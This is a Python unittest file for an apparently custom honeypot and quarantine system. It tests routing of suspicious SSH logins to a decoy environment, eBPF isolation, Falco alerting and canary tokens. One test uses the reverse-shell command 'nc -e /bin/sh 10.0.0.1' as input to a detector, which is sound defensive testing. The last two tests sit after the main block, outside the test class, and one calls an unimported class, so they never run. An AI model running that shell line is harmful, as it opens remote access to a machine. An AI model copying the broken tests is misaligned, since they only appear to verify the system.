"""
Test Suite for CyberSocle Level 2 (Quarantine & eBPF Isolation Floor).
Checks kernel deception routing, eBPF micro-segmentation tightness, Falco supervision,
canary tokens, and Level 1 service continuity.
"""

import os
import unittest
import yaml
from cybersocle.auth.ssh_proxy import SSHAuthenticationGateway, BehavioralAIAuthAgent
from cybersocle.auth.decoy_generator import DynamicDecoyGenerator
from cybersocle.auth.browser_isolation import CellBrowserIsolationController
from cybersocle.logging.sidecar_falco import FalcoSidecarSpy, SyscallMemoryAnonymizer
from cybersocle.logging.merkle_ledger import MerkleLogLedger
from cybersocle.network.ebpf_cilium import apply_ebpf_microsegmentation
from cybersocle.isolation.incident_manager import IncidentIsolationManager


class TestNiveau2Quarantine(unittest.TestCase):

    def setUp(self):
        self.ssh_gateway = SSHAuthenticationGateway()
        self.decoy_gen = DynamicDecoyGenerator()
        self.merkle_ledger = MerkleLogLedger()
        self.incident_mgr = IncidentIsolationManager()

    def test_kernel_deception_routing(self):
        """
        Routage de déception noyau :
        Tentative malveillante / comportement suspect -> bascule immédiatement vers Bateau PRISON (Niveau 2).
        Accès légitime avec clé + TPM + comportement normal -> Bateau OFFICIEL (Niveau 1).
        """
        # 1. Invalid password -> DENIED
        denied = self.ssh_gateway.authenticate_and_route("mike", "wrong_password")
        self.assertFalse(denied["authenticated"])
        self.assertEqual(denied["status"], "DENIED")

        # 2. Valid credentials but untrusted bot behavior -> Redirected to PRISON honeypot
        bot_behavior = {"command_velocity_per_min": 60, "typing_rhythm_ms": 2}
        deception_res = self.ssh_gateway.authenticate_and_route(
            username="mike",
            password="mike_secure_pass_2025",
            encryption_key="valid_local_key_123",
            tpm_signature="valid_tpm_sig_123",
            pcr_quote="tpm_pcr_quote",
            session_behavior_metrics=bot_behavior
        )
        self.assertTrue(deception_res["authenticated"])
        self.assertEqual(deception_res["identity"], "mike-faux")
        self.assertEqual(deception_res["target_ship"], "PRISON")
        self.assertTrue(deception_res["honeypot"])
        self.assertFalse(deception_res["vpn_access"])

        # 3. Legitimate user (mike-vrai) -> Direct access to OFFICIEL with VPN
        legit_behavior = {"command_velocity_per_min": 6, "typing_rhythm_ms": 140}
        legit_res = self.ssh_gateway.authenticate_and_route(
            username="mike",
            password="mike_secure_pass_2025",
            encryption_key="valid_local_key_123",
            tpm_signature="valid_tpm_sig_123",
            pcr_quote="tpm_pcr_quote",
            session_behavior_metrics=legit_behavior
        )
        self.assertTrue(legit_res["authenticated"])
        self.assertEqual(legit_res["identity"], "mike-vrai")
        self.assertEqual(legit_res["target_ship"], "OFFICIEL")
        self.assertFalse(legit_res["honeypot"])
        self.assertTrue(legit_res["vpn_access"])

    def test_ebpf_tightness_and_no_downward_links(self):
        """
        Étanchéité eBPF & Absence de liens descendants :
        S'assurer via micro-segmentation eBPF qu'aucun pont descendant ni privilège n'existe entre Niveau 2 et Niveau 1.
        """
        policies = apply_ebpf_microsegmentation()
        self.assertIn("prison_to_officiel_blocked", policies)
        self.assertTrue(policies["prison_to_officiel_blocked"])
        self.assertTrue(policies["airgap_enforced"])
        self.assertEqual(policies["allowed_egress_from_prison"], [])

        # Incident escalation on prison escape attempt
        escape_res = self.incident_mgr.regenerate_prison_ship_on_escape("cell-attacker")
        self.assertEqual(escape_res["status"], "PRISON_SHIP_REGENERATED")
        self.assertTrue(escape_res["dispatched_to_science"])

    def test_falco_supervision_and_canary_tokens(self):
        """
        Supervision Falco & Canary Tokens :
        Contrôler la présence des règles Falco dans cybersocle/isolation/rules.yaml,
        détection de syscall, alertes canary token, et capture dans l'Arbre de Merkle.
        """
        rules_path = os.path.join("cybersocle", "isolation", "rules.yaml")
        self.assertTrue(os.path.exists(rules_path), "Falco rules.yaml must exist in cybersocle/isolation/")

        with open(rules_path, "r", encoding="utf-8") as f:
            rules_content = yaml.safe_load(f)
        self.assertIsInstance(rules_content, list)
        rule_names = [item.get("rule") for item in rules_content if isinstance(item, dict) and "rule" in item]
        self.assertIn("CyberSocle Reverse Shell Execution", rule_names)
        self.assertIn("CyberSocle Downward Bridge Network Attempt", rule_names)

        # Falco sidecar spy
        spy = FalcoSidecarSpy(cell_id="cell-prison-01", ship_name="PRISON")
        alert = spy.inspect_syscall_event({"type": "execve", "proc_name": "nc", "details": "nc -e /bin/sh 10.0.0.1"})
        self.assertIsNotNone(alert)
        self.assertEqual(alert["alert"], "REVERSE_SHELL_DETECTED")

        # Canary token generation & trigger
        decoy_dataset = self.decoy_gen.generate_decoy_dataset_for_cell("cell-prison-01")
        canary_id = decoy_dataset["canary_tokens"][0]
        canary_alert = self.decoy_gen.check_canary_token_trigger(canary_id)
        self.assertEqual(canary_alert["alert"], "CRITICAL_HONEYPOT_TRIGGER")

        # Capture telemetry in Merkle Tree Ledger
        log_hash = self.merkle_ledger.append_log(canary_alert)
        self.assertTrue(self.merkle_ledger.verify_ledger_integrity())
        self.assertIsNotNone(log_hash)

    def test_level1_service_continuity(self):
        """
        Continuité de service du Niveau 1 :
        Les utilisateurs légitimes continuent d'accéder normalement aux services officiels.
        """
        browser_cfg = CellBrowserIsolationController.configure_cell_browser("OFFICIEL", is_affected=False)
        self.assertTrue(browser_cfg["browser_enabled"])
        self.assertTrue(browser_cfg["vpn_tunnel_active"])
        self.assertEqual(browser_cfg["policy"], "SECURE_CORPORATE_VPN")


if __name__ == "__main__":
    unittest.main()

    def test_2_6_kernel_breakout_resilience(self):
        """
        Test 2.6 — Audit d'évasion par failles Zero-Day noyau :
        Test d'intrusion eBPF / Cilium tentant d'exploiter une vulnérabilité du noyau Linux.
        """
        payload = "EXECUTE_0DAY_PTRACE_KERNEL_ESCAPE_EXPLOIT"
        res = ContainerHardening.verify_kernel_breakout_resilience(payload)
        self.assertEqual(res["status"], "BREAKOUT_BLOCKED")
        self.assertTrue(res["container_escape_prevented"])
        self.assertEqual(res["isolation_level"], "LEVEL_2_QUARANTINE_HERMETIC")

    def test_2_7_side_channel_attack_isolation(self):
        """
        Test 2.7 — Attaques par canaux auxiliaires (Side-Channel) :
        Vérification qu'un attaquant piégé au Niveau 2 ne peut pas déduire d'informations sur la production du Niveau 1.
        """
        manager = IncidentIsolationManager()
        audit = manager.audit_side_channel_isolation()
        self.assertEqual(audit["status"], "SIDE_CHANNEL_ISOLATION_VERIFIED")
        self.assertFalse(audit["cross_tenant_inference_possible"])
        self.assertEqual(audit["level1_officiel_data_leak"], "ZERO_LEAK_CONFIRMED")
